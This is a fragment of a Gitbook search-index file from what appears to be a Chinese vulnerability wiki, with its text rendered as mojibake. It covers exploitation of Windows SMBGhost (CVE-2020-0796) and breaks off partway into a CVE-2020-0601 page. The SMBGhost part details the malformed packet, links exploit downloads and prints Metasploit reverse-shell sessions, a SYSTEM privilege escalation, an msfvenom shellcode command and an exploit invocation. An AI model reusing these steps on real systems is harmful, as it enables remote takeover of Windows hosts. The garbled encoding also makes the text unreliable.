"},"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/":{"url":"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/","title":"æ“ä½œç³»ç»Ÿæ¼æ´","keywords":"","body":"æ“ä½œç³»ç»Ÿæ¼æ´ğŸº PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 19:47:12 "},"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/":{"url":"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/","title":"Windows","keywords":"","body":"Windows Windows CryptoAPIæ¬ºéª—æ¼æ´ CVE-2020-0601 Windows SMBè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-0796 Windows Win32k æœ¬åœ°ææƒæ¼æ´ CVE-2021-1732 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-03-11 09:53:11 "},"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/Scan/":{"url":"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/Scan/","title":"æ‰«æå·¥å…·","keywords":"","body":"æ‰«æå·¥å…· CVE-2020-0796 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-12-19 20:02:49 "},"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/Scan/æ‰«æå·¥å…· CVE-2020-0796.html":{"url":"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/Scan/æ‰«æå·¥å…· CVE-2020-0796.html","title":"æ‰«æå·¥å…· CVE-2020-0796","keywords":"","body":"æ‰«æå·¥å…· CVE-2020-0796 Scanç›®å½•ä»¥æ”¾é’ˆå¯¹ CVE-2020-0796 4ç§ä¸åŒåˆ©ç”¨æ–¹å¼çš„POC å¥‡å®‰ä¿¡ CVE-2020-0796 æ‰«æä¸‹è½½ Github CVE-2020-0796 è“å±EXP ä¸‹è½½ Github CVE-2020-0796 æœ¬åœ°ææƒEXP ä¸‹è½½ Github CVE-2020-0796 RCE EXP PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-12-19 20:05:49 "},"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/Windows SMBè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-0796.html":{"url":"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/Windows SMBè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-0796.html","title":"Windows SMBè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-0796","keywords":"","body":"Windows SMBè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2020-0796 æ¼æ´æè¿° 2020å¹´3æœˆ10æ—¥ï¼Œå¾®è½¯åœ¨å…¶å®˜æ–¹SRCå‘å¸ƒäº†CVE-2020-0796çš„å®‰å…¨å…¬å‘Šï¼ˆADV200005ï¼ŒMicrosoftGuidance for Disabling SMBv3 Compressionï¼‰,å…¬å‘Šè¡¨ç¤ºåœ¨Windows SMBv3ç‰ˆæœ¬çš„å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯å­˜åœ¨è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚åŒæ—¶æŒ‡å‡ºè¯¥æ¼æ´å­˜åœ¨äºMicroSoft Server Message Block 3.1.1åè®®å¤„ç†ç‰¹å®šè¯·æ±‚åŒ…çš„åŠŸèƒ½ä¸­ï¼Œæ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´å¯åœ¨ç›®æ ‡SMB Serveræˆ–è€…Clientä¸­æ‰§è¡Œä»»æ„ä»£ç  æ¼æ´å½±å“ [!NOTE] SMBç‰ˆæœ¬ v3.1.1 Windows 10 Version 1903 for 32-bit Systems Windows 10 Version 1903 for x64-based Systems Windows 10 Version 1903 for ARM64-based Systems Windows Server, Version 1903 (Server Core installation) Windows 10 Version 1909 for 32-bit Systems Windows 10 Version 1909 for x64-based Systems Windows 10 Version 1909 for ARM64-based Systems Windows Server, Version 1909 (Server Core installation) ç¯å¢ƒæ­å»º åœ¨MSDNä¸Šä¸‹è½½å¯¹åº”çš„å­˜åœ¨æ¼æ´çš„ç³»ç»Ÿç‰ˆæœ¬ å®‰è£…åæ‰§è¡Œå‘½ä»¤ winver æŸ¥çœ‹ç³»ç»Ÿç‰ˆæœ¬ï¼Œå¹¶æŸ¥çœ‹æ˜¯å¦å«æœ‰ KB4551762è¡¥ä¸ æ¼æ´å¤ç° æ¼æ´åŸç† CVE-2020-0796æ¼æ´å­˜åœ¨äºå—å½±å“ç‰ˆæœ¬çš„Windowsé©±åŠ¨srv2.sysä¸­ã€‚Windows SMB v3.1.1 ç‰ˆæœ¬å¢åŠ äº†å¯¹å‹ç¼©æ•°æ®çš„æ”¯æŒã€‚å›¾2æ‰€ç¤ºä¸ºå¸¦å‹ç¼©æ•°æ®çš„SMBæ•°æ®æŠ¥æ–‡çš„æ„æˆã€‚ ProtocolIdï¼š4å­—èŠ‚ï¼Œå›ºå®šä¸º0x424D53FC OriginalComressedSegmentSizeï¼š4å­—èŠ‚ï¼ŒåŸå§‹çš„æœªå‹ç¼©æ•°æ®å¤§å° CompressionAlgorithmï¼š2å­—èŠ‚ï¼Œå‹ç¼©ç®—æ³• Flagsï¼š2å­—èŠ‚ï¼Œè¯¦è§åè®®æ–‡æ¡£ Offset/Lengthï¼šæ ¹æ®Flagsçš„å–å€¼ä¸ºOffsetæˆ–è€…Lengthï¼ŒOffsetè¡¨ç¤ºæ•°æ®åŒ…ä¸­å‹ç¼©æ•°æ®ç›¸å¯¹äºå½“å‰ç»“æ„çš„åç§» srv2.sysä¸­å¤„ç†SMBv3å‹ç¼©æ•°æ®åŒ…çš„è§£å‹å‡½æ•°Srv2DecompressDataæœªä¸¥æ ¼æ ¡éªŒæ•°æ®åŒ…ä¸­OriginalCompressedSegmentSizeå’ŒOffset/Lengthå­—æ®µçš„åˆæ³•æ€§ã€‚è€Œè¿™ä¸¤ä¸ªå­—æ®µå½±å“äº†Srv2DecompressDataä¸­å†…å­˜åˆ†é…å‡½æ•°SrvNetAllocateBufferçš„å‚æ•°ã€‚å¦‚å›¾4æ‰€ç¤ºçš„Srv2DecompressDataå‡½æ•°åç¼–è¯‘ä»£ç ï¼ŒSrvNetAllocateBufferå®é™…çš„å‚æ•°ä¸ºOriginalCompressedSegmentSize+Offsetã€‚è¿™ä¸¤ä¸ªå‚æ•°éƒ½ç›´æ¥æ¥æºäºæ•°æ®åŒ…ä¸­SMB Compression Transform Headerä¸­çš„å­—æ®µï¼Œè€Œå‡½æ•°å¹¶æœªåˆ¤æ–­è¿™ä¸¤ä¸ªå­—æ®µæ˜¯å¦åˆæ³•ï¼Œå°±ç›´æ¥å°†å…¶ç›¸åŠ åä½œä¸ºå†…å­˜åˆ†é…çš„å‚æ•°(unsigned intç±»å‹ï¼‰ã€‚ è¿™é‡Œï¼ŒOriginalCompressedSegmentSize+Offsetå¯èƒ½å°äºå®é™…éœ€è¦åˆ†é…çš„å†…å­˜å¤§å°ï¼Œä»è€Œåœ¨åç»­è°ƒç”¨è§£å‹å‡½æ•°SmbCompressionDecompressè¿‡ç¨‹ä¸­å­˜åœ¨è¶Šç•Œè¯»å–æˆ–è€…å†™å…¥çš„é£é™©ã€‚ ç›®å‰å·²å…¬å¼€çš„é’ˆå¯¹è¯¥æ¼æ´çš„æœ¬åœ°ææƒåˆ©ç”¨åŒ…å«å¦‚ä¸‹çš„ä¸»è¦è¿‡ç¨‹ï¼š ï¼ˆ1ï¼‰éªŒè¯ç¨‹åºé¦–å…ˆåˆ›å»ºåˆ°SMS serverçš„ä¼šè¯è¿æ¥ï¼ˆè®°ä¸ºsessionï¼‰ã€‚ ï¼ˆ2ï¼‰éªŒè¯ç¨‹åºè·å–è‡ªèº«tokenæ•°æ®ç»“æ„ä¸­privilegeæˆå‘˜åœ¨å†…æ ¸ä¸­çš„åœ°å€ï¼ˆè®°tokenAddrï¼‰ã€‚ ï¼ˆ3ï¼‰éªŒè¯ç¨‹åºé€šè¿‡sessionå‘é€ç•¸å½¢å‹ç¼©æ•°æ®ï¼ˆè®°ä¸ºevilDataï¼‰ç»™SMB serverè§¦å‘æ¼æ´ã€‚å…¶ä¸­ï¼ŒevilDataåŒ…å«tokenAddrã€æƒé™æ•°æ®ã€æº¢å‡ºå ä½æ•°æ®ã€‚ ï¼ˆ4ï¼‰ SMS serveræ”¶åˆ°evilDataåè§¦å‘æ¼æ´ï¼Œå¹¶ä¿®æ”¹tokenAddråœ°å€å¤„çš„æƒé™æ•°æ®ï¼Œä»è€Œæå‡éªŒè¯ç¨‹åºçš„æƒé™ã€‚ ï¼ˆ5ï¼‰éªŒè¯ç¨‹åºè·å–æƒé™åå¯¹winlogonè¿›è¡Œæ§åˆ¶ï¼Œæ¥åˆ›å»ºsystemç”¨æˆ·shellã€‚ é¦–å…ˆï¼Œçœ‹ä¸€ä¸‹å·²å…¬å¼€åˆ©ç”¨çš„evilDataæ•°æ®åŒ… æ•°æ®åŒ…çš„å†…å®¹å¾ˆç®€å•ï¼Œå…¶ä¸­å‡ ä¸ªå…³é”®å­—æ®µæ•°æ®å¦‚ä¸‹ï¼š OriginalSize ï¼š0xffffffff Offsetï¼š0x10 Real compressed data ï¼š13å­—èŠ‚çš„å‹ç¼©æ•°æ®ï¼Œè§£å‹ååº”ä¸º1108å­—èŠ‚â€™Aâ€™åŠ 8å­—èŠ‚çš„tokenåœ°å€ã€‚ SMB3 raw data ï¼šå®é™…ä¸Šæ˜¯ç”±2ä¸ª8å­—èŠ‚çš„0x1FF2FFFFBCï¼ˆæ€»é•¿0x10)åŠ ä¸Š0x13å­—èŠ‚çš„å‹ç¼©æ•°æ®ç»„æˆ ä»ä¸Šé¢çš„æ¼æ´åŸç†åˆ†æå¯çŸ¥ï¼Œæ¼æ´æˆå› æ˜¯Srv2DecompressDataå‡½æ•°å¯¹æŠ¥æ–‡å­—æ®µç¼ºä¹åˆæ³•æ€§åˆ¤æ–­é€ æˆå†…å­˜åˆ†é…ä¸å½“ã€‚åœ¨è¯¥æ¼æ´æ•°æ®åŒ…ä¸­ï¼ŒOriginalSize æ˜¯ä¸€ä¸ªç•¸å½¢å€¼ã€‚OriginalSize+ Offset = 0xffffffff + 0x10 = 0xf æ˜¯ä¸€ä¸ªå¾ˆå°çš„å€¼ï¼Œå…¶å°†ä¼šä¼ é€’ç»™SrvNetAllocateBufferè¿›è¡Œè°ƒç”¨ï¼Œä¸‹é¢å…·ä½“åˆ†æå†…å­˜åˆ†é…æƒ…å†µã€‚SrvNetAllocateBufferçš„åç¼–è¯‘ä»£ç  ç”±äºä¼ ç»™SrvNetAllocateBufferçš„å‚æ•°ä¸º0xfï¼Œæ ¹æ®SrvNetAllocateBufferçš„å¤„ç†æµç¨‹å¯çŸ¥ï¼Œè¯¥è¯·æ±‚å†…å­˜å°†ä»SrvNetBufferLookasidesè¡¨ä¸­åˆ†é…ã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå˜é‡SrvDisableNetBufferLookAsideListè·Ÿæ³¨å†Œè¡¨é¡¹ç›¸å…³ï¼Œç³»ç»Ÿé»˜è®¤çŠ¶æ€ä¸‹SrvDisableNetBufferLookAsideListä¸º0ã€‚ SrvNetBufferLookasidesè¡¨é€šè¿‡å‡½æ•°SrvNetCreateBufferåˆå§‹åŒ–ï¼Œå®é™…SrvNetCreateBufferå¾ªç¯è°ƒç”¨äº†SrvNetBufferLookasideAllocateåˆ†é…å†…å­˜ï¼Œè°ƒç”¨SrvNetBufferLookasideAllocateçš„å‚æ•°åˆ†åˆ«ä¸º[â€˜0x1100â€™, â€˜0x2100â€™, â€˜0x4100â€™, â€˜0x8100â€™, â€˜0x10100â€™, â€˜0x20100â€™, â€˜0x40100â€™, â€˜0x80100â€™, â€˜0x100100â€™]ã€‚åœ¨è¿™é‡Œï¼Œå†…å­˜åˆ†é…å‚æ•°ä¸º0xfï¼Œå¯¹åº”çš„lookasideè¡¨ä¸º0x1100å¤§å°çš„è¡¨é¡¹ã€‚ SrvNetBufferLookasideAllocateå‡½æ•°å®é™…æ˜¯è°ƒç”¨SrvNetAllocateBufferFromPoolæ¥åˆ†é…å†…å­˜ åœ¨å‡½æ•°SrvNetAllocateBufferFromPoolä¸­ï¼Œå¯¹äºç”¨æˆ·è¯·æ±‚çš„å†…å­˜åˆ†é…å¤§å°ï¼Œå†…éƒ¨é€šè¿‡ExAllocatePoolWithTagå‡½æ•°åˆ†é…çš„å†…å­˜å®é™…è¦å¤§äºè¯·æ±‚å€¼ï¼ˆå¤šå‡ºéƒ¨åˆ†ç”¨äºå­˜å‚¨éƒ¨åˆ†å†…å­˜ç›¸å…³æ•°æ®ç»“æ„ï¼‰ã€‚ä»¥è¯·æ±‚åˆ†é…0x1100å¤§å°ä¸ºä¾‹ï¼Œç»è¿‡ä¸€ç³»åˆ—åˆ¤æ–­åï¼Œæœ€ååˆ†é…çš„å†…å­˜å¤§å°allocate_size= 0x1100 + E8 + 2*(MmSizeOfMdl + 8)ã€‚ å†…å­˜åˆ†é…å®Œæ¯•ä¹‹åï¼ŒSrvNetAllocateBufferFromPoolå‡½æ•°è¿˜å¯¹åˆ†é…çš„å†…å­˜è¿›è¡Œäº†ä¸€ç³»åˆ—åˆå§‹åŒ–æ“ä½œï¼Œæœ€åè¿”å›äº†ä¸€ä¸ªå†…å­˜ä¿¡æ¯ç»“æ„ä½“æŒ‡é’ˆä½œä¸ºå‡½æ•°çš„è¿”å›å€¼ã€‚ è¿™é‡Œéœ€è¦æ³¨æ„å¦‚ä¸‹çš„æ•°æ®å…³ç³»ï¼šSrvNetAllocateBufferFromPoolå‡½æ•°è¿”å›å€¼return_bufferæŒ‡å‘ä¸€ä¸ªå†…å­˜æ•°æ®ç»“æ„ï¼Œè¯¥å†…å­˜æ•°æ®ç»“æ„èµ·å§‹åœ°å€åŒå®é™…åˆ†é…å†…å­˜ï¼ˆå‡½æ•°ExAllocatePoolWithTagåˆ†é…çš„å†…å­˜ï¼‰èµ·å§‹åœ°å€çš„çš„åç§»ä¸º0x1150ï¼›return_buffer+0x18ä½ç½®æŒ‡å‘äº†å®é™…åˆ†é…å†…å­˜èµ·å§‹åœ°å€åç§»0x50ä½ç½®å¤„ï¼Œè€Œæœ€ç»ˆreturn_bufferä¼šä½œä¸ºå‡½æ•°SrvNetAllocateBufferçš„è¿”å›å€¼ å›åˆ°æ¼æ´è§£å‹å‡½æ•°Srv2DecompressDataï¼Œåœ¨è¿›è¡Œå†…å­˜åˆ†é…ä¹‹åï¼ŒSrv2DecompressDataè°ƒç”¨å‡½æ•°SmbCompressionDecompresså¼€å§‹è§£å‹è¢«å‹ç¼©çš„æ•°æ® å®é™…ä¸Šï¼Œè¯¥å‡½æ•°è°ƒç”¨äº†Windowsåº“å‡½æ•°RtlDecompressBufferEx2æ¥å®ç°è§£å‹ï¼Œæ ¹æ®RtlDecompressBufferEx2çš„å‡½æ•°åŸå‹æ¥å¯¹åº”åˆ†æSmbCompressionDecompresså‡½æ•°çš„å„ä¸ªå‚æ•°ã€‚ SmbCompressionDecompress(CompressAlgoï¼Œ//å‹ç¼©ç®—æ³• Compressed_bufï¼Œ//æŒ‡å‘æ•°æ®åŒ…ä¸­çš„å‹ç¼©æ•°æ® Compressed_sizeï¼Œ//æ•°æ®åŒ…ä¸­å‹ç¼©æ•°æ®å¤§å°ï¼Œè®¡ç®—å¾—åˆ° UnCompressedBuf,//è§£å‹åçš„æ•°æ®å­˜å‚¨åœ°å€ï¼Œ*(alloc_buffer+0x18)+0x10 UnCompressedSize,//å‹ç¼©æ•°æ®åŸå§‹å¤§å°,æºäºæ•°æ®åŒ…OriginalCompressedSegmentSize FinalUnCompressedSize)//æœ€ç»ˆè§£å‹åæ•°æ®å¤§å° ä»åç¼–è¯‘ä»£ç å¯ä»¥çœ‹å‡ºï¼Œå‡½æ•°SmbCompressionDecompressä¸­ä¿å­˜è§£å‹åæ•°æ®çš„åœ°å€ä¸º*(alloc_buffer+0x18)+0x10çš„ä½ç½®ï¼Œæ ¹æ®å†…å­˜åˆ†é…è¿‡ç¨‹åˆ†æï¼Œalloc_buffer + 0x18æŒ‡å‘äº†å®é™…å†…å­˜åˆ†é…èµ·å§‹ä½ç½®åç§»0x50å¤„ï¼Œæ‰€ä»¥æ‹·è´ç›®çš„åœ°å€ä¸ºå®é™…å†…å­˜åˆ†é…èµ·å§‹åœ°å€åç§»0x60ä½ç½®å¤„ã€‚ åœ¨è§£å‹è¿‡ç¨‹ä¸­ï¼Œå‹ç¼©æ•°æ®è§£å‹åå°†å­˜å‚¨åˆ°è¿™ä¸ªåœ°å€æŒ‡å‘çš„å†…å­˜ä¸­ã€‚æ ¹æ®evilDataæ•°æ®çš„æ„é€ è¿‡ç¨‹ï¼Œè§£å‹åçš„æ•°æ®ä¸ºå å‘æ•°æ®å’ŒtokenAddrã€‚æ‹·è´åˆ°è¯¥å¤„åœ°å€åï¼ŒtokenAddrå°†è¦†ç›–åŸå†…å­˜æ•°æ®ç»“æ„ä¸­alloc_buffer+0x18å¤„çš„æ•°æ®ã€‚ä¹Ÿå°±æ˜¯è§£å‹ç¼©å‡½æ•°SmbCompressionDecompressè¿”å›åï¼Œalloc_buffer+0x18å°†æŒ‡å‘éªŒè¯ç¨‹åºçš„tokenAddrå†…æ ¸åœ°å€ ç»§ç»­çœ‹Srv2DecompressDataçš„åç»­å¤„ç†æµç¨‹ï¼Œè§£å‹æˆåŠŸåï¼Œå‡½æ•°åˆ¤æ–­offsetçš„ç»“æœä¸ä¸º0ã€‚ä¸ä¸º0åˆ™è¿›è¡Œå†…å­˜ç§»åŠ¨ï¼Œå†…å­˜æ‹·è´çš„å‚æ•°å¦‚ä¸‹ï¼š memmove(*(alloc_buffer+0x18)ï¼ŒSMB_payloadï¼Œoffset) æ­¤æ—¶alloc_buffer+0x18å·²ç»æŒ‡å‘éªŒè¯ç¨‹åºçš„tokenAddrå†…æ ¸åœ°å€ï¼Œè€ŒSMB_payloadæ­¤æ—¶æŒ‡å‘evilDataä¸­çš„æƒé™æ•°æ®ï¼Œoffsetåˆ™ä¸º0x10ã€‚å› æ­¤ï¼Œè¿™ä¸ªå†…å­˜ç§»åŠ¨å®Œæˆåï¼Œæƒé™æ•°æ®å°†å†™å…¥tokenAddrå¤„ã€‚è¿™æ„å‘³ç€ï¼ŒSMS ServeræˆåŠŸä¿®æ”¹äº†éªŒè¯ç¨‹åºçš„æƒé™ï¼Œä»è€Œå®ç°äº†éªŒè¯ç¨‹åºçš„ææƒï¼ è¿˜æœ‰ä¸€ä¸ªç»†èŠ‚éœ€è¦æ³¨æ„ï¼Œåœ¨è§£å‹æ—¶ï¼ŒSrv2DecompressDataå‡½æ•°ä¼šåˆ¤æ–­å®é™…çš„è§£å‹åæ•°æ®å¤§å°FinalUnCompressedSizeæ˜¯å¦å’Œæ•°æ®åŒ…ä¸­åŸå§‹æ•°æ®å¤§å°OriginalCompressedSegmentSizeä¸€è‡´ æŒ‰ç†æ¥è¯´å®é™…è§£å‹åçš„æ•°æ®å¤§å°ä¸º0x1100ï¼Œä¸ç­‰äºæ•°æ®åŒ…ä¸­çš„åŸå§‹å‹ç¼©æ•°æ®å¤§å°0xffffffffï¼Œè¿™é‡Œåº”è¯¥è¿›å…¥åˆ°åé¢å†…å­˜é‡Šæ”¾çš„æµç¨‹ã€‚ç„¶è€Œï¼Œå®é™…ä¸Šåœ¨å‡½æ•°SmbCompressionDecompressä¸­ï¼Œè°ƒç”¨RtlDecompressBufferEx2æˆåŠŸåä¼šç›´æ¥å°†OriginalCompressedSegmentSizeèµ‹å€¼ç»™FinalUnCompressedSizeã€‚è¿™ä¹Ÿæ˜¯è¯¥æ¼æ´å…³äºä»»æ„åœ°å€å†™å…¥æˆåŠŸçš„å…³é”®ä¹‹ä¸€ã€‚ CVE-2020-0796 ç›®æ ‡æ¢æµ‹(å¥‡å®‰ä¿¡) ä½¿ç”¨å¥‡å®‰ä¿¡çš„æ¼æ´æ‰«ææ¥æ¢æµ‹ å¥‡å®‰ä¿¡ CVE-2020-0796 æ‰«æä¸‹è½½ CVE-2020-0796 è“å±EXP Github CVE-2020-0796 è“å±EXP ä¸‹è½½ è¿è¡Œè„šæœ¬åç›®æ ‡æˆåŠŸè“å± CVE-2020-0796 æœ¬åœ°ææƒEXP Github CVE-2020-0796 æœ¬åœ°ææƒEXP ä¸‹è½½ è¿è¡Œåº”ç”¨ç¨‹åºåå¼¹å‡ºcmdçª—å£ä¸º systemæƒé™ æˆ–è€…ä½¿ç”¨ MSFçš„å†…ç½®EXP windows/local/cve_2020_0796_smbghost æ¥æœ¬åœ°ææƒ msf6 exploit(multi/handler) > set lhost 192.168.142.19 lhost => 192.168.142.19 msf6 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.142.19:4444 [*] Sending stage (200262 bytes) to 192.168.142.61 [*] Meterpreter session 2 opened (192.168.142.19:4444 -> 192.168.142.61:51757) at 2020-11-08 15:28:20 +0800 meterpreter > meterpreter > getuid Server username: DESKTOP-RL1VAD8\\wy meterpreter > background msf6 exploit(multi/handler) > search cve_2020 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/admin/sap/cve_2020_6287_ws_add_user 2020-07-14 normal Yes SAP Unauthenticated WebService User Creation 1 exploit/linux/misc/cve_2020_13160_anydesk 2020-06-16 normal Yes AnyDesk GUI Format String Write 2 exploit/windows/local/cve_2020_0668_service_tracing 2020-02-11 excellent No Service Tracing Privilege Elevation Vulnerability 3 exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move 2020-03-10 excellent Yes Background Intelligent Transfer Service Arbitrary File Move Privilege Elevation Vulnerability 4 exploit/windows/local/cve_2020_0796_smbghost 2020-03-13 good Yes SMBv3 Compression Buffer Overflow Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/local/cve_2020_0796_smbghost msf6 exploit(multi/handler) > use 4 [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp msf6 exploit(windows/local/cve_2020_0796_smbghost) > show options Module options (exploit/windows/local/cve_2020_0796_smbghost): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION yes The session to run this module on. Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 192.168.142.19 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Windows 10 v1903-1909 x64 msf6 exploit(windows/local/cve_2020_0796_smbghost) > set session 2 session => 2 msf6 exploit(windows/local/cve_2020_0796_smbghost) > check [*] The target appears to be vulnerable. msf6 exploit(windows/local/cve_2020_0796_smbghost) > exploit [*] Started reverse TCP handler on 192.168.142.19:4444 [*] Executing automatic check (disable AutoCheck to override) [+] The target appears to be vulnerable. [*] Launching notepad to host the exploit... [+] Process 908 launched. [*] Reflectively injecting the exploit DLL into 908... [*] Injecting exploit into 908... [*] Exploit injected. Injecting payload into 908... [*] Payload injected. Executing exploit... [+] Exploit finished, wait for (hopefully privileged) payload execution to complete. [*] Sending stage (200262 bytes) to 192.168.142.61 meterpreter > getuid Server username: NT AUTHORITY\\SYSTEM CVE-2020-0796 RCE EXP Github CVE-2020-0796 RCE EXP msfvenomç”Ÿæˆreversed shellcode msfvenom -p windows/x64/meterpreter/bind_tcp lport=2333 -f py -o exp.py å°†ç”Ÿæˆexp.pyä¸­çš„shellcodeæ›¿æ¢exploit.pyä¸­çš„shellcode [!NOTE] buf è¦æ›¿æ¢ä¸º USER_PAYLOAD ä½¿ç”¨ MSF msf5 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp payload => windows/x64/meterpreter/bind_tcp msf5 exploit(multi/handler) > set lport 2333 lport => 2333 msf5 exploit(multi/handler) > set rhost 192.168.1.110 rhost => 192.168.1.110 msf5 exploit(multi/handler) > exploit æ‰§è¡Œè„šæœ¬å³å¯ python3 exploit.py -ip 192.168.1.110 [!NOTE] æ³¨æ„æœ‰è“å±æ¦‚ç‡ å‚è€ƒæ–‡ç«  Windows SMB Ghostï¼ˆCVE-2020-0796ï¼‰æ¼æ´åˆ†æ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:43 "},"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/Windows CryptoAPIæ¬ºéª—æ¼æ´ CVE-2020-0601.html":{"url":"PeiQi_Wiki/æ“ä½œç³»ç»Ÿæ¼æ´/Windows/Windows CryptoAPIæ¬ºéª—æ¼æ´ CVE-2020-0601.html","title":"Windows CryptoAPIæ¬ºéª—æ¼æ´ CVE-2020-0601","keywords":"","body":"Windows CryptoAPIæ¬ºéª—æ¼æ´ CVE-2020-0601 æ¼æ´æè¿° 1æœˆ15æ—¥ï¼Œå¾®è½¯å‘å¸ƒäº†é’ˆå¯¹CVE-2020-0601çš„å®‰å…¨è¡¥ä¸ï¼Œè¯¥æ¼æ´æ˜¯å¾®è½¯åœ¨å®ç°æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•æ•°å­—è¯ä¹¦éªŒè¯æ—¶äº§ç”Ÿï¼Œå¯è¢«åˆ©ç”¨äºä¼ªé€ æ¥è‡ªå¯ä¿¡ä»»æ¥æºçš„ç­¾åæˆ–è¯ä¹¦ï¼Œå¹¶ä¸”å› å…¶ä¸šåŠ¡ç‰¹æ€§ä¼šè¡ç”Ÿå‡ºå¤šç§æ”»å‡»å‘é‡ï¼Œå…·æœ‰æé«˜çš„å¯åˆ©ç”¨ä»·å€¼å’Œæå¤§çš„æ½œåœ¨ç ´ååŠ›ï¼ŒWin 10å’Œwindows server 2016 & 2019ä¹Ÿéƒ½åœ¨å…¶å½±å“èŒƒå›´å†…ã€‚è¯¥æ¼æ´ç”±ç¾å›½NSAå›½å®¶å®‰å…¨å±€å‘ç°åæ±‡æŠ¥ç»™å¾®è½¯å…¬å¸ï¼Œä¹Ÿè¢«è®¤ä¸ºæ˜¯ç¬¬ä¸€ä¸ªNSAå…¬å¼€æŠ«éœ²çš„è½¯ä»¶ç³»ç»Ÿæ¼æ´ï¼Œå½“ç„¶ä¹Ÿæœ‰å¯èƒ½å­˜åœ¨å…¶ç‰¹æ®Šçš„æˆ˜æœ¯ç›®çš„ã€‚ç»¿ç›Ÿç§‘æŠ€M01Næ”»å‡»å®‰å…¨ç ”ç©¶å›¢é˜Ÿå¯¹æ­¤æ¼æ´åŸç†è¿›è¡Œäº†è¯¦ç»†åˆ†æå¹¶å¤ç°äº†å¤šç§å¯èƒ½çš„æ”»å‡»æ–¹æ³•ï¼Œæå‡ºäº†è¯¦ç»†çš„æ£€æµ‹åŠæ•´æ”¹æ–¹æ¡ˆã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] å¸¦æœ‰æŒ‡å®šå‚æ•°çš„ECCå¯†é’¥çš„è¯ä¹¦çš„Microsoft Windowsç‰ˆæœ¬ ä¾èµ–äºWindows CryptoAPIçš„åº”ç”¨ç¨‹åº æ¼æ´å¤ç° æ¼æ´åŸç† CVE-2020-0601çš„æ ¹æºæ˜¯å¾®è½¯çš„åŠ å¯†åº“crypt32.dllä¸­æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•çš„å®ç°é—®é¢˜ï¼Œé¦–å…ˆæˆ‘ä»¬æ¥äº†è§£ä¸€ä¸‹æ¤­åœ†åŠ å¯†ç®—æ³•çš„åŸºæœ¬åŸç†ã€‚ è¦å½¢è±¡åœ°ç†è§£æ¤­åœ†æ›²çº¿åŠ å¯†ç®—æ³•ï¼Œå¯ä»¥ç»“åˆå›¾å½¢æ¥çœ‹ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªç¬¦åˆæ¤­åœ†æ›²çº¿çš„æ–¹ç¨‹y2 = x3 + ax + bï¼Œå›¾åƒå¦‚ä¸‹ï¼š æ¤­åœ†æ›²çº¿å…·æœ‰çš„ä¸€äº›ç‹¬ç‰¹çš„æ€§è´¨ä½¿å®ƒé€‚åˆç”¨äºåŠ å¯†ç®—æ³•ï¼š æ¤­åœ†æ›²çº¿å…³äºxè½´å¯¹ç§° ä»»ä½•ä¸€æ¡éå‚ç›´çš„çº¿ä¸æ›²çº¿æœ€å¤šæœ‰ä¸‰ä¸ªç‚¹ç›¸äº¤ æ›²çº¿æ˜¯å…‰æ»‘çš„ï¼Œå³æ›²çº¿çš„æ‰€æœ‰ç‚¹éƒ½æ²¡æœ‰ä¸¤ä¸ªæˆ–è€…ä¸¤ä¸ªä»¥ä¸Šçš„ä¸åŒçš„åˆ‡çº¿ 